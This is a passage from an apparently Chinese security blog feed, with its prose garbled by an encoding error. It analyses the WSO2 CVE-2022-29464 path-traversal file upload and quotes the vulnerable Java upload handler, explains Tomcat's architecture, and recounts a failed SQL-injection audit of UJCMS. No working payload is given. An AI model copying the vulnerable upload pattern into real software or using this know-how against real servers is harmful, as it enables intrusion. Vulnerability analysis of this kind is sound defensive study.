alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¤§æ¦‚çš„æ„æ€å°±æ˜¯<br>é¦–å…ˆä½¿ç”¨<code>getCanonical</code>å‡½æ•°å¯¹<code>dirs</code>è¿›è¡Œè§„èŒƒåŒ–ï¼Œè¿™ä¸ªå‡½æ•°å¤„ç†ä¼šå°†ç±»ä¼¼â€™..&#x2F;..&#x2F;..&#x2F;..&#x2F;â€˜è¿™ç§ç»™å¹²æ‰ç›´æ¥è·å–æœ€ç»ˆçš„è·¯å¾„ï¼Œè¿™ç§æ—¶å€™å¦‚æœæˆ‘ä»¬ä½¿ç”¨ç›®å½•ç©¿è¶Šå°†ä¼šä½¿å¾—æœ€ç»ˆè·å–çš„è·¯å¾„äº§ç”Ÿå˜åŒ–ï¼Œç„¶åä½¿ç”¨<code>extraFileLocation</code>å˜é‡æ–°å»ºä¸€ä¸ªFileå¯¹è±¡ï¼Œç„¶åä¹Ÿè°ƒç”¨<code>getCanonicalPath</code>å‡½æ•°è¿›è¡Œè§„èŒƒåŒ–ï¼Œç„¶åè°ƒç”¨<code>startsWith</code>å‡½æ•°åˆ¤æ–­åç”Ÿæˆçš„<code>canonicalDestinationFile</code>æ˜¯å¦ä»¥<code>canonicalDestinationPath</code>å¼€å¤´ï¼Œå¦‚æœä¸æ˜¯çš„è¯å°±æŠ›å‡ºå¼‚å¸¸ï¼Œå¾ˆæ˜æ˜¾å¦‚æœæˆ‘ä»¬å¯¹<code>canonicalDestinationPaht</code>ä½¿ç”¨äº†ç›®å½•ç©¿è¶Šçš„è¯é‚£ä¹ˆå°†å¿…ç„¶å¯¼è‡´æŠ›å‡ºå¼‚å¸¸ï¼Œé‚£ä¹ˆæ–‡ä»¶ä¸Šä¼ ä¹Ÿå°±å¤±è´¥äº†ã€‚ä½†æ˜¯è¿™é‡Œæˆ‘è¿˜æœ‰ä¸ªç–‘æƒ‘ï¼Œè¿™é‡Œ<code>canonicalDestinationPath</code>çš„è·å–æ˜¯ä½¿ç”¨<code>extraFileLocation</code>æ‹¼æ¥äº†<code>fileName</code>çš„æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„åªæœ‰<code>fileName</code>ï¼Œæˆ‘ä»¬çœ‹çœ‹<code>fileName</code>æ€ä¹ˆæ¥çš„</p>
<blockquote>
<p>String fileName &#x3D; getFileName(fileItem.getFileName());</p>
</blockquote>
<p>è¿™é‡Œé¦–å…ˆä½¿ç”¨<code>fileItem.getFileName()</code>è·å–äº†ä¸€éï¼Œè¿™æ—¶å€™è·å»çš„æ–‡ä»¶åå¦‚æœæœ‰ç›®å½•ç©¿è¶Šçš„ç‰¹å¾æ˜¯ä¼šå½±å“åˆ°ä¸Šä¼ ç›®çš„åœ°çš„ï¼Œä½†æ˜¯è¿™é‡Œè¿˜è°ƒç”¨äº†å½“å‰ç±»çš„æ–¹æ³•<code>getFileName</code>å°±ä¸ä¸€æ ·äº†ï¼Œæˆ‘ä»¬çœ‹çœ‹è¿™ä¸ªå‡½æ•°æ€ä¹ˆå®šä¹‰çš„<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f9d8f8ea56387625b386d2fe36708dd7.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ€æ–°çš„ä»£ç åªæ˜¯ä¿®æ”¹äº†å®ç°æ–¹å¼ï¼Œå½“ç„¶è¿˜æ˜¯æœ‰ä¸€ç‚¹åŒºåˆ«ï¼Œä¸»è¦æ˜¯æ–°çš„ä»£ç é‡Œå¯¹ç©ºå­—èŠ‚æˆªæ–­è¿›è¡Œäº†å¤„ç†ï¼Œå½“ç„¶è¿™å¹¶ä¸å½±å“ä»€ä¹ˆï¼Œè¿™é‡Œåªå–äº†æœ€åä¸€ä¸ª<code>\\</code>æˆ–è€…<code>/</code>åé¢çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´ç›®å½•ç©¿è¶Šåœ¨è¿™é‡Œå°±å·²ç»è¢«é¿å…æ‰äº†ï¼Œæˆ‘å®åœ¨æ²¡æƒ³æ˜ç™½ä¸ºä»€ä¹ˆåé¢è¦å†è¿›è¡Œä¸€æ¬¡å¤„ç†ã€‚<br>å½“ç„¶èµ°åˆ°è¿™é‡Œå…¶å®æˆ‘çš„æ€è·¯å·²ç»å‡ºäº†é—®é¢˜ï¼Œæˆ‘çœ‹çš„è¿™ä¸ªæ–‡ä»¶æ˜¯<code>FielUploadServer.java</code>è€Œæˆ‘ä»¬åœ¨è·¯å¾„æ˜ å°„æ–‡ä»¶ä¸­çœ‹åˆ°çš„å®é™…å¤„ç†æ–‡ä»¶ä¸Šä¼ çš„ç±»ä¸º<br><img src="https://i-blog.csdnimg.cn/blog_migrate/172058099f83306af784c92f4834621c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å®³ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥å»æ‰¾åˆ°è¿™ä¸ªç±»ï¼š</p>
<blockquote>
<p><a href="https://github.com/bhagyasakalanka/carbon-kernel/blob/release-4.4.9/core/org.wso2.carbon.ui/src/main/java/org/wso2/carbon/ui/transports/fileupload/ToolsAnyFileUploadExecutor.java">https://github.com/bhagyasakalanka/carbon-kernel/blob/release-4.4.9/core/org.wso2.carbon.ui/src/main/java/org/wso2/carbon/ui/transports/fileupload/ToolsAnyFileUploadExecutor.java</a></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*  Copyright (c) 2005-2010, WSO2 Inc. (http://www.wso2.org) All Rights Reserved.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*  WSO2 Inc. licenses this file to you under the Apache License,</span></span><br><span class="line"><span class="comment">*  Version 2.0 (the &quot;License&quot;); you may not use this file except</span></span><br><span class="line"><span class="comment">*  in compliance with the License.</span></span><br><span class="line"><span class="comment">*  You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*    http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* Unless required by applicable law or agreed to in writing,</span></span><br><span class="line"><span class="comment">* software distributed under the License is distributed on an</span></span><br><span class="line"><span class="comment">* &quot;AS IS&quot; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY</span></span><br><span class="line"><span class="comment">* KIND, either express or implied.  See the License for the</span></span><br><span class="line"><span class="comment">* specific language governing permissions and limitations</span></span><br><span class="line"><span class="comment">* under the License.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">package</span> org.wso2.carbon.ui.transports.fileupload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.bidimap.TreeBidiMap;</span><br><span class="line"><span class="keyword">import</span> org.wso2.carbon.CarbonException;</span><br><span class="line"><span class="keyword">import</span> org.wso2.carbon.utils.FileItemData;</span><br><span class="line"><span class="keyword">import</span> org.wso2.carbon.utils.ServerConstants;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ToolsAnyFileUploadExecutor</span> <span class="keyword">extends</span> <span class="title class_">AbstractFileUploadExecutor</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">execute</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">			HttpServletResponse response)</span> <span class="keyword">throws</span> CarbonException, IOException &#123;</span><br><span class="line">		<span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        	<span class="type">Map</span> <span class="variable">fileResourceMap</span> <span class="operator">=</span></span><br><span class="line">                (Map) configurationContext</span><br><span class="line">                        .getProperty(ServerConstants.FILE_RESOURCE_MAP);</span><br><span class="line">        	<span class="keyword">if</span> (fileResourceMap == <span class="literal">null</span>) &#123;</span><br><span class="line">        		fileResourceMap = <span class="keyword">new</span> <span class="title class_">TreeBidiMap</span>();</span><br><span class="line">        		configurationContext.setProperty(ServerConstants.FILE_RESOURCE_MAP,</span><br><span class="line">                                             fileResourceMap);</span><br><span class="line">        	&#125;</span><br><span class="line">            List&lt;FileItemData&gt; fileItems = getAllFileItems();</span><br><span class="line">            <span class="comment">//String filePaths = &quot;&quot;;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (FileItemData fileItem : fileItems) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">uuid</span> <span class="operator">=</span> String.valueOf(</span><br><span class="line">                        System.currentTimeMillis() + Math.random());</span><br><span class="line">                <span class="type">String</span> <span class="variable">serviceUploadDir</span> <span class="operator">=</span></span><br><span class="line">                        configurationContext</span><br><span class="line">                                .getProperty(ServerConstants.WORK_DIR) +</span><br><span class="line">                                File.separator +</span><br><span class="line">                                <span class="string">&quot;extra&quot;</span> + File</span><br><span class="line">                                .separator +</span><br><span class="line">                                uuid + File.separator;</span><br><span class="line">                <span class="type">File</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(serviceUploadDir);</span><br><span class="line">                <span class="keyword">if</span> (!dir.exists()) &#123;</span><br><span class="line">                    dir.mkdirs();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">File</span> <span class="variable">uploadedFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dir, fileItem.getFileItem().getFieldName());</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fileOutStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(uploadedFile)) &#123;</span><br><span class="line">                    fileItem.getDataHandler().writeTo(fileOutStream);</span><br><span class="line">                    fileOutStream.flush();</span><br><span class="line">                &#125;</span><br><span class="line">                response.setContentType(<span class="string">&quot;text/plain; charset=utf-8&quot;</span>);</span><br><span class="line">                <span class="comment">//filePaths = filePaths + uploadedFile.getAbsolutePath() + &quot;,&quot;;</span></span><br><span class="line">                fileResourceMap.put(uuid, uploadedFile.getAbsolutePath());</span><br><span class="line">                out.write(uuid);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//filePaths = filePaths.substring(0, filePaths.length() - 1);</span></span><br><span class="line">            <span class="comment">//out.write(filePaths);</span></span><br><span class="line">            out.flush();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;File upload FAILED&quot;</span>, e);</span><br><span class="line">            out.write(<span class="string">&quot;&lt;script type=\&quot;text/javascript\&quot;&gt;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;top.wso2.wsf.Util.alertWarning(&#x27;File upload FAILED. File may be non-existent or invalid.&#x27;);&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            out.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œä¸»è¦æ˜¯è°ƒç”¨<code>execute</code>å‡½æ•°æ¥å¤„ç†æ–‡ä»¶ä¸Šä¼ è¯·æ±‚ã€‚è¿™é‡Œå°±ä¸æ˜¯è·å–çš„æ–‡ä»¶åè€Œæ˜¯<code>FieldName</code>ä¹Ÿå°±æ˜¯æ–‡ä»¶ä¸Šä¼ è¯·æ±‚çš„<code>name</code>å‚æ•°çš„å€¼è¿›è¡Œæ‹¼æ¥<br><img src="https://i-blog.csdnimg.cn/blog_migrate/09cb5f27e9889018181e9417a894e4a5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œå¾ˆæ˜æ˜¾æ˜¯æœ‰è·¯å¾„ç©¿è¶Šçš„é—®é¢˜çš„ï¼Œæ‰€ä»¥åˆ°è¿™é‡Œæ‰€æœ‰çš„é—®é¢˜åŸºæœ¬å°±è¢«æ‰“é€šäº†ã€‚ä½†è¿˜æœ‰ä¸€ä¸ªå›°æ‰°æˆ‘çš„é—®é¢˜ï¼Œå°±æ˜¯è¿™ä¸ªè·¯ç”±çš„å†™æ³•ï¼Œå¯èƒ½åªæœ‰å¯¹è¿™ä¸ªäº§å“æ¯”è¾ƒäº†è§£çš„äººæ‰èƒ½å¾ˆå¥½çš„æŠŠè¿™ä¸ªé«˜æ¸…æ¥šå§ï¼Œæ”¾ä¸€å¼ å¤ç°çš„æˆªå›¾<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7e28e8967577e71f88f0f07d96b1556a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸ç”¨ç®¡é‚£ä¸ª403ï¼Œæˆ‘åšäº†åˆ«çš„æµ‹è¯•ï¼Œå…·ä½“çš„pocå°±ä¸å‘äº†ï¼Œæ²¡æ„ä¹‰ï¼Œè¿˜æ˜¯è¦æ‡‚åŸç†æ‰å¥½ã€‚</p>
<p>å½“ç„¶å…¶å®åœ¨githubä¸Šå·²ç»æœ‰å¤§å“¥è¿›è¡Œäº†è¯¦ç»†çš„åˆ†æï¼Œä½†æˆ‘è¿˜æ²¡æœ‰ä»”ç»†å»çœ‹</p>
<blockquote>
<p><a href="https://github.com/hakivvi/CVE-2022-29464">https://github.com/hakivvi/CVE-2022-29464</a></p>
</blockquote>
<p>å®˜æ–¹è¯´æ˜</p>
<blockquote>
<p><a href="https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738">https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738</a></p>
</blockquote>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>ä»»æ„æ–‡ä»¶ä¸Šä¼ </tag>
        <tag>WOS2</tag>
        <tag>CVE-2022-29464</tag>
      </tags>
  </entry>
  <entry>
    <title>tomcatæ¶æ„å­¦ä¹ </title>
    <url>/archives/53313e1c.html</url>
    <content><![CDATA[<p>tomcaté‡è¦çš„æ¦‚å¿µæœ‰Server Service Connector Container Engine Host Context Wrapper</p>
<table>
<thead>
<tr>
<th>ç»„ä»¶</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>Server</td>
<td>ä¸€ä¸ªTomcatæœåŠ¡å™¨ä¸­åªèƒ½æœ‰ä¸€ä¸ªServer</td>
</tr>
<tr>
<td>Service</td>
<td>ä¸€ä¸ªServerä¸‹å¯ä»¥æœ‰å¤šä¸ªService</td>
</tr>
<tr>
<td>Connector</td>
<td>ä¸€ä¸ªServiceå¯ä»¥æœ‰å¤šä¸ªConnectorï¼Œä¸åŒçš„Connectorå®ç°äº†ä¸åŒçš„åè®®ï¼Œå¦‚HTTPä¸AJPï¼Œè¿™ä¸¤ä¸ªåè®®æ˜¯Tomcatä¸­æ¨¡å¼å®ç°çš„åè®®ã€‚Connectorè¿˜è´Ÿè´£Socketçš„å»ºç«‹ï¼Œä½¿ç”¨ProtocolHandlerå¤„ç†å­—èŠ‚æ•°æ®ï¼Œå°è£…requestä¸responseå¯¹è±¡ï¼Œç„¶åä½¿ç”¨Adaptorå°†Requestä¸Responseå°è£…æˆHTTPRequestä¸HTTPResponseå¯¹è±¡ã€‚åè®®å¤„ç†å™¨åŒ…å«äº†å¯¹å„ç±»IOæ¡†æ¶çš„æ”¯æŒï¼Œå¸¸ç”¨çš„ä¸ºNio(å¼‚æ­¥ä¸é˜»å¡) Apr Bio(Jioï¼Œé˜»å¡)</td>
</tr>
<tr>
<td>Contaier</td>
<td>ä¸€ä¸ªServiceå¯ä»¥åŒ…å«å¤šä¸ªå®¹å™¨ï¼Œå®¹å™¨æ˜¯Engin,Hostï¼ŒContext,Wrpperé¡¶å±‚å°è£…ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™å››ä¸ªæ˜¯Containerçš„å­å®¹å™¨ï¼Œåœ¨ä»£ç å±‚é¢ä»–ä»¬éƒ½ç»§æ‰¿äº†Containerç±»</td>
</tr>
<tr>
<td>Engine</td>
<td>Tomcaté»˜è®¤å®ç°çš„å¼•æ“ä¸ºCatalinaï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥å®ç°è‡ªå·±çš„å¼•æ“</td>
</tr>
<tr>
<td>Host</td>
<td>Hostå°±æ˜¯å­—é¢æ„æ€ï¼Œè¡¨ç¤ºä¸åŒçš„ä¸»æœºï¼Œä¹Ÿå°±æ˜¯åœ¨HTTP&#x2F;1.1ä¸­çš„hostå¤´æŒ‡å®šçš„å†…å®¹ï¼ŒTomcatæ ¹æ®è¯¥æ ‡å¤´å°†è¯·æ±‚å‘é€ç»™ä¸åŒçš„StandardHostå®¹å™¨å¤„ç†</td>
</tr>
<tr>
<td>Context</td>
<td>ä¸€ä¸ªContextå°±æ˜¯ä¸€ä¸ªåº”ç”¨ï¼Œåœ¨Tomcatçš„æ¨¡å¼Hostä¸­ä¹Ÿå°±æ˜¯æ¨¡å¼çš„webappsç›®å½•ä¸‹ï¼Œä¸€ä¸ªç›®å½•å°±æ˜¯ä¸€ä¸ªåº”ç”¨</td>
</tr>
<tr>
<td>Wrapper</td>
<td>Wapperæ˜¯å¯¹Servletçš„å°è£…ï¼Œä¸€ä¸ªServletå°±æ˜¯ä¸€ä¸ªWapper</td>
</tr>
</tbody></table>
<p>å››ä¸ªå­å®¹å™¨åœ¨è°ƒç”¨çš„æ—¶å€™ä½¿ç”¨çš„æ˜¯è´£ä»»é“¾æ¨¡å¼ï¼Œæ¯ä¸ªå®¹å™¨é€šè¿‡Piplineç®¡é“ä¸²è”èµ·æ¥ï¼Œæ¯ä¸ªPiplineä¸­åŒ…å«äº†ä¸€ç³»åˆ—çš„Valve(é˜€é—¨)ï¼ŒTomcatæ¨¡å¼æ¯ä¸ªå®¹å™¨å®ç°äº†ä¸€ä¸ªæ ‡å‡†çš„Valveï¼Œåˆ†åˆ«ä¸ºStandardEnginValve,StandardHostValve,StandardContextValve,StandardWrapperValveï¼Œè¿™å››ä¸ªç®¡é“åœ¨æ¯ä¸ªå®¹å™¨ä¸­æ”¾åœ¨å„è‡ªçš„é¡¶å±‚è¢«æœ€åä¸€ä¸ªè°ƒç”¨ï¼Œè´Ÿè´£ä¸²è”ä¸‹ä¸€ä¸ªå®¹å™¨çš„,è¿™å››ä¸ªç®¡é“ä¸­çš„invokeæ–¹æ³•è´Ÿè´£è°ƒç”¨ä¸‹ä¸€ä¸ªå®¹å™¨çš„çš„ç¬¬ä¸€ä¸ªValve<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2291dbc663b4f22e4a333b392386cc27.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å°±è¿™æ ·å››ä¸ªå®¹å™¨è¢«ä¸²è”èµ·æ¥ï¼Œæœ€åçš„StandardWrapperValveè´Ÿè´£å°†è¯·æ±‚ä¸å“åº”ä¼ é€’åˆ°FilterChainï¼Œæ‰§è¡Œä¸€ç³»åˆ—è¿‡æ»¤å™¨ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3d80cb5154af0061144ce94d257a2918.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨Tomcatçš„server.xmlæ–‡ä»¶ä¸­åœ¨å„ä¸ªå®¹å™¨ä¸‹è‡ªå®šä¹‰ä¸€ç³»åˆ—çš„Valveæ¥å›è¯·æ±‚è¿›è¡Œæ‹¦æˆªè¿‡æ»¤ã€‚è¯·æ±‚åœ¨ç»è¿‡ä¸€ç³»åˆ—è¿‡æ»¤å™¨åç”±æœ€åä¸€ä¸ªè¿‡æ»¤å™¨è°ƒç”¨servletçš„serviceæ–¹æ³•<br><img src="https://i-blog.csdnimg.cn/blog_migrate/512b8451cd7715f905b2a8465b18e0ec.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ€ç»ˆserviceæ–¹æ³•æ ¹æ®è¯·æ±‚çš„æ–¹å¼è°ƒç”¨å¯¹åº”çš„doGetã€doPostç­‰æ–¹æ³•ï¼Œå®Œæˆæ•´ä¸ªæµç¨‹çš„é—­ç¯ã€‚</p>
<p>Tomcatæ•´ä¸ªè®¾è®¡ä½¿ç”¨äº†JMXï¼ˆJava Manager Extensionï¼‰æ¥å®ç°å¯¹æ•´ä¸ªåº”ç”¨çš„ç›‘æ§ï¼Œäºæ˜¯å¯ä»¥ä½¿ç”¨JConsoleè¿›è¡Œç›‘æ§ï¼Œè¦å®ç°ä¸€ä¸ªJMXåº”ç”¨éœ€è¦å®ç°ä¸€ä¸ªä¸€ä¸ªçš„MBeanï¼Œä½œä¸ºè¢«ç›‘æ§çš„å¯¹è±¡ï¼Œç„¶åæä¾›ä¸€ä¸ªMBeanServer æ¥å¯¹æ‰€æœ‰çš„Mbeanè¿›è¡Œç›‘æ§ã€‚</p>
<p>Tomcatåœ¨æ¯ä¸ªæµç¨‹çš„å®ç°ä¸­è¿˜å¤§é‡ä½¿ç”¨äº†è§‚å¯Ÿè€…æ¨¡å¼æ¥è¿›è¡Œç”Ÿå‘½å‘¨æœŸç®¡ç†<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a3be82bb692e8b498f9b2b311e2f9ef3.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è§‚å¯Ÿè€…æ¨¡å¼ä¸€èˆ¬éœ€è¦ä¸‰ç±»å¯¹è±¡ï¼Œåˆ†åˆ«æ˜¯Subject OBClient  OBServerã€‚Subjectè´Ÿè´£æ³¨å†Œä¸€ä¸ªä¸ªè§‚å¯Ÿè€…ï¼Œä¸é€šçŸ¥æ‰€æœ‰è§‚å¯Ÿè€…ï¼ŒOBserverä¸ºä¸€ä¸ªä¸ªçš„è§‚å¯Ÿè€…ï¼Œä¸€èˆ¬éœ€è¦å®šä¹‰ä¸€ä¸ªæ¥å£ï¼Œç„¶åæ ¹æ®éœ€è¦å®ç°ä¸€ä¸ªä¸ªè§‚å¯Ÿè€…å¯¹è±¡ï¼ŒOBclientä¸ºè¢«è§‚å¯Ÿå¯¹è±¡ï¼Œå½“è¢«è§‚å¯Ÿå¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ä¼šé€šçŸ¥Subjectï¼Œç”±å…¶é€šçŸ¥æ‰€æœ‰çš„è§‚å¯Ÿè€…åšå¯¹åº”çš„æ“ä½œã€‚åœ¨Tomcatä¸­LifeCycleä½œä¸ºæ¥å£ç”±æŠ½è±¡ç±»LifeCycleBaseéƒ¨åˆ†å®ç°ï¼Œå‡¡æ˜¯ç»§æ‰¿äº†LifeCycleBaseç±»çš„å­ç±»éƒ½ä½œä¸ºä¸€ä¸ªä¸ªè§‚å¯Ÿè€…ï¼Œå…¶æä¾›äº†addLifecycleListeneræ–¹æ³•æ³¨å†Œä¸€ä¸ªä¸ªç›‘å¬å™¨ï¼Œä¹Ÿå°±æ˜¯ä¸€ç³»åˆ—çš„è§‚å¯Ÿè€…ï¼Œå½“è¢«è§‚å¯Ÿè€…çŠ¶æ€ï¼ˆå¯åŠ¨è¿‡ç¨‹çš„æ¨è¿›ã€init\load\startç­‰ï¼‰å‘ç”Ÿå˜åŒ–æ—¶ç”±LifeCycleBase#fireLifecycleEventæ–¹æ³•è°ƒç”¨å„ä¸ªç›‘å¬å™¨çš„lifecycleEventæ–¹æ³•å‘é€é€šçŸ¥ç»™æ‰€æœ‰çš„è§‚å¯Ÿè€…ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4d89df83b388792b2f8dee1374eb0e8a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸‹å›åˆ†è§£ï¼ŒTomcatå¯åŠ¨æµç¨‹ã€‚ã€‚ã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€æ¬¡å¤±è´¥çš„JAVAä»£ç å®¡è®¡-SQLæ³¨å…¥</title>
    <url>/archives/b8d90c0d.html</url>
    <content><![CDATA[<p>æœ¬æ¬¡å®¡è®¡çš„CMSç³»ç»Ÿä¸ºUJCMSæœ€æ–°ç‰ˆã€‚ç«‹è¶³äºæˆ‘ç°åœ¨çš„å®¡è®¡æ°´å¹³æš‚æ—¶æ˜¯æ²¡æœ‰å‘ç°è¯¥ç³»ç»Ÿçš„æ¼æ´çš„ï¼Œæ‹‰èƒ¯ã€‚æœ¬æ¥ä»Šå¤©æ™šä¸Šè·Ÿä¸€ä¸ªSQLæ³¨å…¥çš„ç‚¹è·Ÿçš„æœ¬æ¥éƒ½è¦å¤§åŠŸå‘Šæˆäº†ï¼Œç»“æœè¢«å½“å¤´æ£’å–ï¼Œå­¦ä¼šäº†ä»€ä¹ˆå«äººç”Ÿçš„å‚å·®ã€‚åºŸè¯ä¸å¤šè¯´ç›´æ¥å¼€å¹²ã€‚<br>ç›´æ¥åœ¨æ•´ä¸ªé¡¹ç›®ä¸­æœç´¢å…³é”®å­— <code>order by $&#123;</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/82739f44b0d9fd7572daa223c583c0be.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆå¦‚æœè¿™ä¸ª<code>queryInfo.orderBy</code>å¯æ§çš„è¯å°±çš†å¤§æ¬¢å–œäº†ï¼Œç›®å‰æ¥çœ‹æœ‰å¾ˆå¤§æœºä¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/46b91c4c867dea6874e9f5b174651dd2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œæ³¨æ„åˆ°order by æ˜¯åœ¨ä¸€æ¡idä¸º<code>Select_ALL</code>çš„è¯­å¥ä¸­ï¼Œå¯¹åº”çš„<code>mybatis</code>æ–‡ä»¶åä¸º<code>SeqMapper.xml</code>ï¼Œæœ€å¼€å§‹çš„æ—¶å€™æˆ‘å°±å»æ‰¾å¯¹åº”åç§°çš„<code>DAO</code>å±‚å®ç°ç±»ï¼Œç»“æœä¸€ç›´æ²¡æœ‰æ‰¾åˆ°ã€‚æœ€åè¿«ä¸å¾—å·²ç›´æ¥æ¥äº†ä¸ªå…¨å±€æœç´¢<br><img src="https://i-blog.csdnimg.cn/blog_migrate/254a328e59662d472abdba7abd98d13f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ³¨æ„åˆ°<code>Select_ALL</code>å‡ºç°åœ¨å…¶ä»–çš„<code>mybatis</code>æ˜ å°„æ–‡ä»¶çš„<code>include</code> æ ‡ç­¾é‡Œï¼Œè¿™ä¸ªæ ‡ç­¾å°±å’Œphpé‡Œçš„includeæˆ–è€…requireä¸€ä¸ªåŠŸèƒ½ï¼Œç”¨ä½œä»£ç å¤ç”¨ã€‚é‚£ä¹ˆæˆ‘ä»¬éšä¾¿è¿›å…¥ä¸€ä¸ª<code>mapper.xml</code>ï¼Œè¿™é‡Œä»¥<code>Article.mapper</code>ä¸ºä¾‹ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/82b1150a5d9c2d9bc9318d3b99103b37.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œçš„sqlè¯­å¥idä¸º<code>selectAll</code>ï¼Œè¿”å›å€¼ç±»å‹ä¸º<code>ResultMap</code>ï¼Œç„¶åæ‰¾åˆ°å¯¹åº”çš„<code>DAO</code>å±‚å®ç°ç±»<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4ab6fbb786f6ba96f10eb785e26d3065.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ³¨æ„åˆ°è¿™é‡Œæ˜¯ä¸ªæ¥å£è€Œä¸æ˜¯å®ç°ç±»ï¼Œè¿™æ˜¯å› ä¸º<code>@Mapper  @Repository</code> è¿™ä¸¤ä¸ªæ³¨è§£çš„åŠŸåŠ³@Mapperå¯ä»¥ä½¿æ¥å£åœ¨ç¼–è¯‘æ—¶è‡ªåŠ¨ç”Ÿæˆå™¨å®ç°ç±»ï¼Œ@Repositryæ³¨è§£å¸®åŠ©å®ç°è‡ªåŠ¨æ³¨å…¥ã€‚ç„¶åå°±æ˜¯å–æ‰¾å¯¹åº”çš„<code>Services</code>å±‚ï¼Œè¿™é‡Œä¹Ÿæ˜¯å»æ‰¾å¯¹åº”æ–‡ä»¶åï¼Œä¸å‡ºæ„å¤–æ˜¯<code>ArticleService.java</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/8f4a52e3de92113b3c20724aa72956ae.png" 